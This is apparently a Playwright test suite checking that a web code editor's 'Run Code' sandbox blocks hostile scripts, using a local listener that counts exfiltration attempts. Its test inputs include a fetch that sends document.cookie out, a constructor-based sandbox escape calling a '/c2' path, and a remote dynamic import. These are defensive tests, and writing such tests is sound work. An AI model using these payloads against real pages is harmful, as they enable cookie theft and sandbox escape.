import http from 'node:http';
import { expect, test } from '@playwright/test';

/**
 * Run Code adversarial tests in a REAL browser worker (not vm fakes):
 * a controlled local HTTP endpoint counts exfiltration attempts, and the
 * UI output panel is asserted for blocks, errors, timeouts, and output.
 */

let exfilServer;
let exfilPort = 0;
let exfilHits = 0;

test.beforeAll(async () => {
  exfilServer = http.createServer((req, res) => {
    exfilHits += 1;
    // CORS open: the positive-control fetch below must complete so the
    // hit is counted; attack-runner fetches never leave the worker.
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
    res.end('logged');
  });
  await new Promise((resolve) => exfilServer.listen(0, '127.0.0.1', resolve));
  exfilPort = exfilServer.address().port;
});

test.afterAll(async () => {
  await new Promise((resolve) => exfilServer.close(resolve));
});

test.beforeEach(() => {
  exfilHits = 0;
});

async function openWorkspace(page, room) {
  await page.goto(`/?room=${room}`);
  await expect(page.locator('.monaco-editor')).toBeVisible({ timeout: 30000 });
}

// See collab.spec.js: press-per-character avoids keyboard.type()'s
// synthetic beforeinput-without-input stream, which Monaco 0.56 can
// misapply. Faithful trusted key events only.
async function setEditorCode(page, code) {
  await page.locator('.monaco-editor .view-lines').click();
  await page.keyboard.press('ControlOrMeta+a');
  for (const ch of code) {
    // eslint-disable-next-line no-await-in-loop
    await page.keyboard.press(ch === ' ' ? 'Space' : ch === '\n' ? 'Enter' : ch);
    // eslint-disable-next-line no-await-in-loop
    await page.waitForTimeout(15);
  }
}

async function ensureJsFile(page, name) {
  await page.getByTitle('New File', { exact: true }).click();
  await page.getByLabel('New file name').fill(name);
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name })).toBeVisible({ timeout: 15000 });
  await page.getByRole('tab', { name }).click();
}

async function runAndReadOutput(page) {
  await page.getByRole('button', { name: /^run /i }).click();
  const consoleBox = page.locator('div[aria-label="Output console"]');
  await expect(consoleBox).toBeVisible({ timeout: 15000 });
  return consoleBox;
}

test('exfil detector is live (page-context fetch reaches the listener)', async ({ page }) => {
  // Positive control: proves a missed exfiltration would be caught, so
  // exfilHits===0 in the attack tests below means blocked, not deaf.
  await openWorkspace(page, `e2e-run-canary-${Date.now()}`);
  await page.evaluate((port) => fetch(`http://127.0.0.1:${port}/canary`), exfilPort);
  expect(exfilHits).toBe(1);
});

test('ordinary JavaScript runs and returns output', async ({ page }) => {
  await openWorkspace(page, `e2e-run-ok-${Date.now()}`);
  await ensureJsFile(page, 'run-ok.js');
  await setEditorCode(page, 'console.log(2 + 3);');
  const consoleBox = await runAndReadOutput(page);
  await expect(consoleBox).toContainText('5', { timeout: 15000 });
  expect(exfilHits).toBe(0);
});

test('direct fetch to an exfil endpoint is blocked', async ({ page }) => {
  await openWorkspace(page, `e2e-run-fetch-${Date.now()}`);
  await ensureJsFile(page, 'run-fetch.js');
  await setEditorCode(page, `fetch("http://127.0.0.1:${exfilPort}/collect?d="+document.cookie);`);
  const consoleBox = await runAndReadOutput(page);
  await expect(consoleBox).toContainText(/error/i, { timeout: 15000 });
  expect(exfilHits).toBe(0);
});

test('constructor-recovered fetch is blocked', async ({ page }) => {
  await openWorkspace(page, `e2e-run-ctor-${Date.now()}`);
  await ensureJsFile(page, 'run-ctor.js');
  await setEditorCode(
    page,
    `const F = (async function*(){}).constructor; new F("return fetch(\\"http://127.0.0.1:${exfilPort}/c2\\")")();`,
  );
  const consoleBox = await runAndReadOutput(page);
  await expect(consoleBox).toContainText(/error/i, { timeout: 15000 });
  expect(exfilHits).toBe(0);
});

test('infinite loops are terminated by the timeout', async ({ page }) => {
  test.setTimeout(30000);
  await openWorkspace(page, `e2e-run-loop-${Date.now()}`);
  await ensureJsFile(page, 'run-loop.js');
  await setEditorCode(page, 'while (true) {}');
  const consoleBox = await runAndReadOutput(page);
  await expect(consoleBox).toContainText(/timed out/i, { timeout: 20000 });
});

test('literal dynamic import is refused before execution', async ({ page }) => {
  await openWorkspace(page, `e2e-run-import-${Date.now()}`);
  await ensureJsFile(page, 'run-import.js');
  await setEditorCode(page, `import("http://127.0.0.1:${exfilPort}/mod.js");`);
  const consoleBox = await runAndReadOutput(page);
  await expect(consoleBox).toContainText(/blocked|import/i, { timeout: 15000 });
  expect(exfilHits).toBe(0);
});
